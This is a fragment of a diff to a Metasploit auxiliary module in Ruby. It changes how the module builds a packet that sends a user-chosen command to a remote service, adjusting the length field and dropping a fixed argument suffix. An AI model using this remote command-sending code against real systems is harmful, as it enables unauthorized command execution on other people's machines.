@@ -39,13 +39,12 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			connect
 
-				len = 12 + datastore['CMD'].length
-		
+				len  = 2 + datastore['CMD'].length		
+				
 				data =  [0x00000000].pack('V')
 				data << len.chr
 				data << "\x00"
-				data << datastore['CMD']
-				data << " -123456789"
+				data << datastore['CMD'] + " "
 				data << "\x00"
 		
 				print_status("Sending command: #{datastore['CMD']}")	
